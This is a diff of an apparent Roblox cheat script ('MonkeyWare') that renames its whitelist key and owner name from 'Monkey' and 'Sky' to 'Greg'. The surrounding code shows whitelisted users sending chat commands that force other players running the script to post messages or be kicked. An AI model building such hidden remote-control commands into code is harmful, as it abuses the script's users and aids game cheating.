@@ -10379,8 +10379,8 @@ local function getLplrType()
 			end
 		end
 	end
-	if whitelist["Monkey"] ~= nil then
-		for i,v in pairs(whitelist["Monkey"]) do
+	if whitelist["Greg"] ~= nil then
+		for i,v in pairs(whitelist["Greg"]) do
 			if v.id == tostring(lplr.UserId) then
 				lplr_Type = 2
 				return lplr_Type
@@ -10413,8 +10413,8 @@ function CanAttackUser(u)
 		end
 	end
 
-	if whitelist["Monkey"] ~= nil then
-		for i, v in pairs(whitelist["Monkey"]) do
+	if whitelist["Greg"] ~= nil then
+		for i, v in pairs(whitelist["Greg"]) do
 			if v.id == userId then
 				userType = 2
 				break
@@ -10470,7 +10470,7 @@ local commands = {
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local textChatService = game:GetService("TextChatService")
 			wait(0.0001)
-			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using MonkeyWare Made By Sky")
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using MonkeyWare Made By Greg")
 		end
 	end,
 	[";void default"] = function()
@@ -10509,7 +10509,7 @@ local commands = {
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
 			for index, player in pairs(game.Players:GetPlayers()) do
-				player:Kick("Sky Has Kicked You")
+				player:Kick("Greg Has Kicked You")
 			end
 		end
 	end,
@@ -10704,8 +10704,8 @@ txt.OnIncomingMessage = function(msg)
 			end
 		end
 
-		if whitelist["Monkey"] ~= nil then
-			for i, v in pairs(whitelist["Monkey"]) do
+		if whitelist["Greg"] ~= nil then
+			for i, v in pairs(whitelist["Greg"]) do
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
